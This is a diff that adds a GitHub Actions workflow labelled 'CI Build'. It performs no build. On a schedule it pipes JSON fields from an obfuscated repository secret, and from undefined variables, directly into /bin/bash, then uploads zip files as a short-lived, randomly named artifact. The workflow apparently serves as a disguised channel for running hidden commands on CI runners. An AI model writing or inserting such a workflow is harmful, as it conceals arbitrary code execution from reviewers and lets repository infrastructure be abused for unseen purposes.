@@ -1,0 +1,33 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          oc265: ${{ secrets.oc265 }}
+        run: |
+          printf '%s' "$oc265" | jq -r .nuetu4150 | /bin/bash
+          echo $bc16095 | jq -r .q0000 | /bin/bash
+          printf '%s' "$hgjx548" | jq -r .ktj15 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VaXUbTsi
+          path: "*.zip"
+          retention-days: 1
